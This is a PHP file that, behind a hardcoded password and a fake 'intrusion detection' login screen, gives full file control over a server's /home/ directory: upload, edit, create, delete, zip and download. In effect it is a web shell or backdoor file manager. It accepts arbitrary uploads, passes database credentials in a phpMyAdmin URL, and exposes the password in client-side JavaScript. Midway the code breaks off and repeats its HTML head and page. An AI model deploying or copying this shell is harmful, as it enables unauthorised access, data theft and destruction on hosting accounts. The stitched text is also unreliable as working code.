<?php
session_start();

$PASSWORD = '@MALABORA';

if (isset($_POST['password'])) {
    if ($_POST['password'] === $PASSWORD) {
        $_SESSION['authenticated'] = true;
    } else {
        $loginError = "Incorrect password.";
    }
}

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <title>Access - Hostly Terminal</title>

        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            html,body{height:100%;margin:0;background:#000;overflow:hidden;font-family: "Source Code Pro", Consolas, Monaco, monospace;color:#00ff6a;}
            #matrix {position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.28;filter: blur(0.6px);}
            .terminal-wrap{position:relative;z-index:2;min-height:420px;display:flex;align-items:center;justify-content:center;height:100vh;padding:20px}
            .terminal {width:920px;max-width:95%;background:linear-gradient(180deg, rgba(2,10,6,0.85) 0%, rgba(0,0,0,0.7) 100%);border:1px solid rgba(0,255,120,0.08);box-shadow:0 20px 60px rgba(0,0,0,0.75), 0 0 40px rgba(0,255,120,0.06) inset;padding:28px;border-radius:12px;overflow:hidden;transform: translateZ(0);}
            .term-head{display:flex;align-items:center;gap:10px;margin-bottom:12px}
            .term-dot{width:12px;height:12px;border-radius:50%;background:#ff5f56;box-shadow:0 0 12px rgba(255,95,86,0.3)}
            .term-dot.yellow{background:#ffbd2e}
            .term-dot.green{background:#27c93f}
            .term-title{flex:1;color:#9ef5b3;font-weight:700;font-size:14px;letter-spacing:0.6px}
            .term-content{position:relative;padding:18px;background:rgba(0,0,0,0.35);border-radius:8px;border:1px solid rgba(0,255,120,0.03)}
            .term-lines{font-size:14px;line-height:1.6;color:#9ef5b3;min-height:160px;max-height:320px;overflow:hidden}
            .scanline {pointer-events:none;position:absolute;left: -40%;top: -40%;width: 200%;height: 200%;background: radial-gradient(circle at 30% 30%, rgba(0,255,120,0.02), transparent 8%), linear-gradient(90deg, rgba(255,255,255,0.02) 0%, rgba(0,0,0,0) 20%, rgba(255,255,255,0.02) 100%);mix-blend-mode: screen;animation: scan 6s linear infinite;z-index:1;transform: rotate(15deg);}
            @keyframes scan { 0% { transform: translateY(-40%) rotate(15deg); } 100% { transform: translateY(40%) rotate(15deg); } }
            .stamp {position: absolute;right: -60px;top: 40px;z-index: 3;transform: rotate(-20deg);font-weight:900;color:#ff2e2e;font-size:58px;letter-spacing:6px;opacity:0.92;text-shadow: 0 0 24px rgba(255,0,0,0.35), 0 0 6px rgba(255,0,0,0.55);mix-blend-mode: screen;-webkit-mask-image: linear-gradient(#000 60%, transparent 100%);animation: stampFlicker 1.1s ease-in-out infinite;}
            @keyframes stampFlicker {0% { transform: rotate(-20deg) scale(1); opacity:0.92; filter: drop-shadow(0 0 6px rgba(255,0,0,0.5)); } 50% { transform: rotate(-17deg) scale(1.02); opacity:0.75; filter: drop-shadow(0 0 18px rgba(255,0,0,0.9)); } 100% { transform: rotate(-20deg) scale(1); opacity:0.92; }}
            .prompt {display:flex;align-items:center;gap:10px;margin-top:18px;}
            .prompt .label {min-width:120px;color:#74f086;font-weight:700}
            .terminal form {display:flex;gap:8px;align-items:center}
            .terminal input[type="password"]{background:transparent;border:1px solid rgba(0,255,120,0.12);color:#b8ffcf;padding:10px 12px;border-radius:6px;outline:none;font-family:inherit;box-shadow: 0 6px 18px rgba(0,255,120,0.03) inset;}
            .terminal input[type="password"]:focus {box-shadow:0 0 20px rgba(0,255,120,0.12), 0 0 8px rgba(0,255,120,0.06) inset;border-color:#00ff7a}
            .btn-terminal {background: linear-gradient(180deg,#00a84f,#00ff7a); border:none;color:#001b0a;padding:10px 16px;border-radius:6px;font-weight:700;box-shadow: 0 6px 18px rgba(0,255,120,0.08);}
            .btn-terminal:hover {transform: translateY(-2px); box-shadow:0 10px 30px rgba(0,255,120,0.12)}
            .err {margin-top:12px;padding:10px;border-radius:6px;background:rgba(255,0,0,0.06);border:1px solid rgba(255,0,0,0.12);color:#ff8f8f;font-weight:700;display:inline-block}
            .typing {color:#b8ffcf; display:inline-block; white-space:nowrap; overflow:hidden; max-width:100%}
            .typing .cursor {display:inline-block;background:#b8ffcf;width:10px;height:18px;margin-left:6px;vertical-align:middle;animation: blink 1s steps(2) infinite}
            @keyframes blink {50% {opacity:0}}
            .tiny {font-size:12px;color:#6fbf8d;margin-top:14px}
            @media (max-width:640px){.terminal{padding:18px}.stamp{font-size:38px;right:-40px;top:20px}.term-title{font-size:12px}}
        </style>
    </head>
    <body>
        <canvas id="matrix"></canvas>

        <div class="terminal-wrap">
            <div class="terminal">
                <div class="term-head">
                    <div class="term-dot"></div><div class="term-dot yellow"></div><div class="term-dot green"></div>
                    <div class="term-title">hostly-secure/terminal — access-control</div>
                    <div style="color:#4bff9a;font-size:12px;font-weight:600">v1.3</div>
                </div>

                <div class="term-content">
                    <div class="stamp">PROHIBITED</div>
                    <div class="scanline"></div>

                    <div class="term-lines" aria-live="polite">
                        <div><strong style="color:#7cffb8">[WARN]</strong> Unauthorized access detected.</div>
                        <div style="color:#a7ffd1">This file is <strong>prohibited</strong> to Hostly Philippines Developer.</div>
                        <div style="margin-top:12px;color:#a6ffcf"><span class="typing" id="typer"></span><span class="cursor"></span></div>

                        <div class="prompt" style="margin-top:18px">
                            <div class="label">sudo access:</div>
                            <form method="POST" style="flex:1;display:flex;align-items:center">
                                <input type="password" name="password" autocomplete="current-password" placeholder="enter password..." aria-label="password" required>
                                <button class="btn btn-terminal" type="submit">AUTH</button>
                            </form>
                        </div>

                        <?php if (!empty($loginError)) echo '<div class="err">' . htmlspecialchars($loginError) . '</div>'; ?>

                        <div class="tiny">Hostly Intrusion Detection • All activities are logged</div>
                    </div>
                </div>
            </div>
        </div>

        <script>
        // Matrix rain effect
        (function(){
            const canvas = document.getElementById('matrix');
            const ctx = canvas.getContext('2d');
            let W = canvas.width = window.innerWidth;
            let H = canvas.height = window.innerHeight;
            const cols = Math.floor(W / 18);
            const ypos = Array(cols).fill(0);
            const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()[]{}<>?/|\\";
            function draw(){
                ctx.fillStyle = 'rgba(0,0,0,0.08)';
                ctx.fillRect(0,0,W,H);
                ctx.fillStyle = '#00ff7a';
                ctx.font = 'bold 14px monospace';
                for(let i=0;i<ypos.length;i++){
                    const text = letters.charAt(Math.floor(Math.random()*letters.length));
                    ctx.fillText(text, i*18, ypos[i]*18);
                    if(ypos[i]*18 > H && Math.random() > 0.975) ypos[i]=0;
                    ypos[i]++;
                }
            }
            setInterval(draw, 50);
            window.addEventListener('resize', function(){
                W = canvas.width = window.innerWidth;
                H = canvas.height = window.innerHeight;
            });
        })();

        (function(){
            const lines = [
                ">>> Access restricted: file flagged PROHIBITED.",
                ">>> If you are authorized, enter credentials to override.",
                ">>> All sessions are monitored.",
            ];
            const el = document.getElementById('typer');
            let line = 0, pos = 0;
            function type() {
                if(line >= lines.length) return;
                const text = lines[line];
                el.textContent = text.slice(0,pos);
                pos++;
                if(pos > text.length){
                    line++;
                    pos = 0;
                    setTimeout(type, 800);
                } else {
                    setTimeout(type, 40 + Math.random()*40);
                }
            }
            type();
        })();

        (function(){ setTimeout(function(){ const pw = document.querySelector('input[type=password]'); if(pw) pw.focus(); },300); })();
        </script>
    </body>
    </html>
    <?php
    exit; 
}

$configPath = $_SERVER['DOCUMENT_ROOT'] . '/app/config.php';
if (!file_exists($configPath)) die("Config file not found at: $configPath");
$config = include $configPath;

// DB credentials from config.php
$db_host = $config['db']['host'];
$db_user = $config['db']['user'];
$db_pass = $config['db']['pass'];
$db_name = $config['db']['name'];

$baseDir = "/home/";
$currentDir = realpath($baseDir . ($_GET['path'] ?? ''));
$message = '';
if (strpos($currentDir, realpath($baseDir)) !== 0) {
    die("Access denied.");
}

function handleFileAction($action, $fileName = '', $fileContent = '', $uploadedFile = null) {
    global $currentDir, $message;
    $filePath = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
    switch ($action) {
        case 'edit': return file_exists($filePath) ? htmlspecialchars(file_get_contents($filePath)) : setMessage("danger", "File does not exist.");
        case 'save': if (is_writable($currentDir)) {file_put_contents($filePath, $fileContent);return setMessage("success", "File successfully saved.");}return setMessage("danger", "Directory is not writable.");
        case 'delete': if (file_exists($filePath)) {if (unlink($filePath)) {return setMessage("success", "File successfully deleted.");}return setMessage("danger", "Failed to delete the file.");}return setMessage("danger", "File does not exist.");
        case 'delete_folder':if (is_dir($filePath)) {if (deleteFolder($filePath)) {return setMessage("success", "Folder and its contents successfully deleted.");}return setMessage("danger", "Failed to delete the folder.");}return setMessage("danger", "Folder does not exist.");
        case 'download':if (file_exists($filePath)) {header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');header('Content-Length: ' . filesize($filePath));readfile($filePath);exit;}return setMessage("danger", "File does not exist.");
        case 'upload':$fileContent = file_get_contents($uploadedFile['tmp_name']);if (file_put_contents($filePath, $fileContent) !== false) {return setMessage("success", "File uploaded successfully.");}return setMessage("danger", "Failed to write the uploaded file.");
        case 'create':if (!file_exists($filePath) && file_put_contents($filePath, "") !== false) {return setMessage("success", "File created successfully.");}return setMessage("danger", "File already exists or failed to create.");
        case 'zip_folder':return zipFolder($filePath);
        default: return '';
    }
}

function zipFolder($folderPath) {
    $zip = new ZipArchive();
    $zipFileName = $folderPath . '.zip';
    if ($zip->open($zipFileName, ZipArchive::CREATE) === true) {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folderPath),RecursiveIteratorIterator::LEAVES_ONLY);
        foreach ($iterator as $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($folderPath) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }
        $zip->close();
        return setMessage("success", "Folder successfully zipped: " . basename($zipFileName));
    }
    return setMessage("danger", "Failed to zip the folder.");
}

function deleteFolder($folderPath) {
    if (!is_dir($folderPath)) return false;
    $files = array_diff(scandir($folderPath), array('.', '..'));
    foreach ($files as $file) {
        $filePath = $folderPath . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {deleteFolder($filePath);} else {unlink($filePath);}
    }
    return rmdir($folderPath);
}

function setMessage($type, $message) {
    return '<div class="alert alert-' . $type . ' mt-3 text-center">' . htmlspecialchars($message) . '</div>';
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_POST['edit_file'])) {
        $content = handleFileAction('edit', $_POST['edit_file']);
    } elseif (isset($_POST['file_name'], $_POST['file_content'])) {
        $message = handleFileAction('save', $_POST['file_name'], $_POST['file_content']);
    } elseif (isset($_POST['delete_file'])) {
        $message = handleFileAction('delete', $_POST['delete_file']);
    } elseif (isset($_POST['delete_folder'])) {
        $message = handleFileAction('delete_folder', $_POST['delete_folder']);
    } elseif (isset($_POST['download_file'])) {
        $message = handleFileAction('download', $_POST['download_file']);
    } elseif (isset($_FILES['upload_file'])) {
        $message = handleFileAction('upload', $_FILES['upload_file']);
    } elseif (isset($_POST['new_file_name'])) {
        $message = handleFileAction('create', $_POST['new_file_name']);
    } elseif (isset($_POST['zip_folder'])) {
        $message = handleFileAction('zip_folder', $_POST['zip_folder']);
    } elseif (isset($_POST['open_phpmyadmin'])) {
    $phpmyadminUrl = "/phpmyadmin/index.php";
    header("Location: $phpmyadminUrl?pma_username={$db_user}&pma_password={$db_pass}&db={$db_name}");
    exit;
}
}

// ==================== HTML ====================
$items = array_diff(scandir($currentDir), array('.', '..'));
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Explorer</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://site-assets.fontawesome.com/releases/v6.7.2/css/all.css" rel="stylesheet">
<style>
body{font-family:Segoe UI,sans-serif;background:#e9ecef;}
.header-buttons{position:sticky;top:0;background:#fff;padding:16px;border-bottom:1px solid #ddd;display:flex;gap:12px;align-items:center;border-radius:0 0 12px 12px;}
.list-group-item{background:#fff;border:1px solid #ddd;margin-bottom:6px;border-radius:12px;padding:10







}

$items = array_diff(scandir($currentDir), array('.', '..'));
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Explorer</title>

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://site-assets.fontawesome.com/releases/v6.7.2/css/all.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.58.3/codemirror.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.58.3/theme/dracula.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.58.3/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.58.3/mode/javascript/javascript.min.js"></script>

<style>
    /* General Page */
    html, body {
        margin: 0;
        padding: 0;
        height: 100%;
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        background: #e9ecef;
        color: #333;
        overflow-x: hidden;
    }

    /* Header */
    .header-buttons {
        position: sticky;
        top: 0;
        z-index: 10;
        background: #fff;
        padding: 16px 24px;
        border-bottom: 1px solid #ddd;
        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        gap: 12px;
        border-radius: 0 0 12px 12px;
        transition: all 0.3s ease;
    }

    .header-buttons:hover {
        box-shadow: 0 6px 20px rgba(0,0,0,0.15);
    }

    .header-buttons h2 {
        margin: 0;
        font-size: 1.6rem;
        color: #343a40;
        flex: 1;
    }

    /* List of files/folders */
    .list-group-item {
        background: #fff;
        border: 1px solid #ddd;
        color: #333;
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 6px;
        border-radius: 12px;
        padding: 10px 16px;
        transition: all 0.3s ease;
        box-shadow: 0 2px 6px rgba(0,0,0,0.08);
    }

    .list-group-item:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 18px rgba(0,0,0,0.12);
        background: #f8f9fa;
    }

    .list-group-item a {
        color: #007bff;
        text-decoration: none;
        flex: 1;
    }

    .list-group-item a:hover {
        text-decoration: underline;
    }

    /* Buttons with 3D / gradient style */
    .btn {
        border-radius: 8px;
        padding: 8px 16px;
        font-weight: 500;
        cursor: pointer;
        transition: all 0.3s ease;
        border: none;
        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }

    .btn-primary {
        background: linear-gradient(145deg, #4e9af1, #1d6fe1);
        color: #fff;
    }
    .btn-primary:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 12px rgba(0,0,0,0.15);
    }

    .btn-success {
        background: linear-gradient(145deg, #43d97f, #28a745);
        color: #fff;
    }
    .btn-success:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 12px rgba(0,0,0,0.15);
    }

    .btn-danger {
        background: linear-gradient(145deg, #ff6b6b, #dc3545);
        color: #fff;
    }
    .btn-danger:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 12px rgba(0,0,0,0.15);
    }

    .btn-warning {
        background: linear-gradient(145deg, #ffdf7e, #ffc107);
        color: #212529;
    }
    .btn-warning:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 12px rgba(0,0,0,0.15);
    }

    .btn-secondary {
        background: linear-gradient(145deg, #868e96, #6c757d);
        color: #fff;
    }
    .btn-secondary:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 12px rgba(0,0,0,0.15);
    }

    /* Breadcrumb */
    .breadcrumb {
        background: transparent;
        border: none;
        margin-bottom: 20px;
        padding-left: 0;
    }
    .breadcrumb a {
        color: #007bff;
        text-decoration: none;
    }
    .breadcrumb a:hover {
        text-decoration: underline;
    }

    /* File Editor */
    .CodeMirror {
        height: calc(100vh - 260px);
        border-radius: 12px;
        box-shadow: 0 4px 16px rgba(0,0,0,0.1);
    }

    /* Terminal card / container */
    .terminal-card {
        position: relative;
        background: #fff;
        padding: 20px;
        border-radius: 16px;
        box-shadow: 0 8px 24px rgba(0,0,0,0.12);
        overflow: hidden;
        transition: all 0.3s ease;
    }
    .terminal-card:hover {
        transform: translateY(-2px);
        box-shadow: 0 12px 32px rgba(0,0,0,0.18);
    }

    form input, form button {
        border-radius: 8px;
        padding: 8px;
        border: 1px solid #ccc;
    }

    .file-actions form {
        display: inline-block;
        margin-left: 8px;
    }

    #matrix-bg,
    .stamp,
    .scanline {
        display: none;
    }
</style>
</head>
<body>


<div class="header-buttons container-fluid">
    <div class="row align-items-center w-100">
        <div class="col-md-4 mb-2 mb-md-0">
            <h2>Directory File Explorer</h2>
        </div>
        <div class="col-md-8 d-flex flex-column flex-md-row gap-2 justify-content-center justify-content-md-end">

            <!-- Upload File Form -->
            <form method="POST" enctype="multipart/form-data" class="d-flex align-items-center w-100 w-md-auto">
                <div class="input-group">
                    <input type="file" name="upload_file" class="form-control" required>
                    <button class="btn btn-primary" type="submit">Upload</button>
                </div>
            </form>

            <!-- Create New File Form -->
            <form method="POST" class="d-flex align-items-center w-100 w-md-auto">
                <div class="input-group">
                    <input type="text" name="new_file_name" class="form-control" placeholder="New File Name" required>
                    <button class="btn btn-success" type="submit">Create File</button>
                </div>
            </form>

            <!-- PhpMyAdmin Button -->
            <form method="POST" class="d-flex align-items-center w-100 w-md-auto">
                <div class="input-group">
            <button class="btn btn-warning" type="button" data-bs-toggle="modal" data-bs-target="#adminModal">
                <i class="fas fa-database"></i> PhpMyAdmin
            </button>
            </div>
            </form>

            <!-- Logout Button -->
            <form method="POST" class="d-flex align-items-center w-100 w-md-auto">
                <button class="btn btn-danger" type="submit" name="logout">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </button>
            </form>

        </div>
    </div>
</div>

<!-- Admin Access Modal -->
<div class="modal fade" id="adminModal" tabindex="-1" aria-labelledby="adminModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header bg-warning text-dark">
        <h5 class="modal-title" id="adminModalLabel">Admin Access Required</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <p>Enter admin password to access PhpMyAdmin:</p>
        <input type="password" id="adminPassword" class="form-control" placeholder="Admin password">
        <div id="adminError" class="text-danger mt-2" style="display:none;">Incorrect password</div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
        <button type="button" class="btn btn-warning" id="adminSubmit">Access</button>
      </div>
    </div>
  </div>
</div>

<!-- Bootstrap JS (must be loaded before your modal script) -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>

<!-- Admin Access Script -->
<script>
document.addEventListener('DOMContentLoaded', function() {
    const adminSubmit = document.getElementById('adminSubmit');
    const adminPassword = document.getElementById('adminPassword');
    const adminError = document.getElementById('adminError');

    adminSubmit.addEventListener('click', function() {
        const password = adminPassword.value;
        const correct = '@MALABORA';

        if(password === correct){
            adminError.style.display = 'none';
            window.open('/adminer-autologin.php?key=@MALABORA', '_blank');
            const modalEl = document.getElementById('adminModal');
            const modal = bootstrap.Modal.getOrCreateInstance(modalEl);
            modal.hide();
            adminPassword.value = '';
        } else {
            adminError.style.display = 'block';
        }
    });
});
</script>


<div class="container m-4 terminal-card">
    <?php echo $message; ?>

    <nav aria-label="breadcrumb">
        <ol class="breadcrumb">
            <?php
            $pathParts = explode(DIRECTORY_SEPARATOR, str_replace($baseDir, "", $currentDir));
            $path = "";
            echo '<li class="breadcrumb-item"><a href="?"><i class="fas fa-home"></i></a></li>';
            foreach ($pathParts as $part) {
                if($part){
                    $path .= $part.DIRECTORY_SEPARATOR;
                    echo '<li class="breadcrumb-item"><a href="?path='.urlencode($path).'">'.htmlspecialchars($part).'</a></li>';
                }
            }
            ?>
        </ol>
    </nav>

    <?php if(empty($content)):
        $folders = []; $files = [];
        $items = array_diff(scandir($currentDir), ['.','..']);
        foreach($items as $item){
            $itemPath = $currentDir.DIRECTORY_SEPARATOR.$item;
            if(is_dir($itemPath)){$folders[]=$item;}else{$files[]=$item;}
        }
        sort($folders); sort($files);
    ?>
    <ul class="list-group">
        <?php foreach($folders as $folder): ?>
        <li class="list-group-item">
            <a href="?path=<?php echo urlencode(str_replace($baseDir,"",$currentDir.DIRECTORY_SEPARATOR.$folder)); ?>">
                <i class="fa-solid fa-folder"></i> <?php echo htmlspecialchars($folder); ?>
            </a>
            <div class="file-actions">
                <form method="POST"><input type="hidden" name="delete_folder" value="<?php echo htmlspecialchars($folder); ?>"><button class="btn btn-danger btn-sm">Delete</button></form>
                <form method="POST"><input type="hidden" name="zip_folder" value="<?php echo htmlspecialchars($folder); ?>"><button class="btn btn-warning btn-sm">Zip</button></form>
            </div>
        </li>
        <?php endforeach; ?>

        <?php foreach($files as $file): ?>
        <li class="list-group-item">
            <form method="POST" class="d-inline">
                <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($file); ?>">
                <button class="btn btn-secondary btn-sm"><i class="fa-solid fa-file"></i> <?php echo htmlspecialchars($file); ?></button>
            </form>
            <div class="file-actions">
                <form method="POST"><input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($file); ?>"><button class="btn btn-primary btn-sm">Edit</button></form>
                <form method="POST"><input type="hidden" name="delete_file" value="<?php echo htmlspecialchars($file); ?>"><button class="btn btn-danger btn-sm">Delete</button></form>
                <form method="POST"><input type="hidden" name="download_file" value="<?php echo htmlspecialchars($file); ?>"><button class="btn btn-success btn-sm">Download</button></form>
            </div>
        </li>
        <?php endforeach; ?>
    </ul>
    <?php endif; ?>

    <?php if(!empty($content)): ?>
    <form method="POST" action="" id="file-form">
        <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_POST['edit_file']); ?>">
        <button class="btn btn-success mb-2" type="submit">Save</button>
        <textarea id="file_content" class="form-control" name="file_content" rows="10"><?php echo $content; ?></textarea>
    </form>
    <script>
    var editor = CodeMirror.fromTextArea(document.getElementById("file_content"), {
        mode:"javascript", theme:"dracula", lineNumbers:true,
        extraKeys:{"Ctrl-S": function(e){ e.save(); document.getElementById("file-form").submit(); },"Ctrl-Z":"undo","Ctrl-Y":"redo"},
        autoCloseBrackets:true, matchBrackets:true, indentUnit:4, tabSize:4, lineWrapping:true
    });
    </script>
    <?php endif; ?>
</div>
</body>
</html>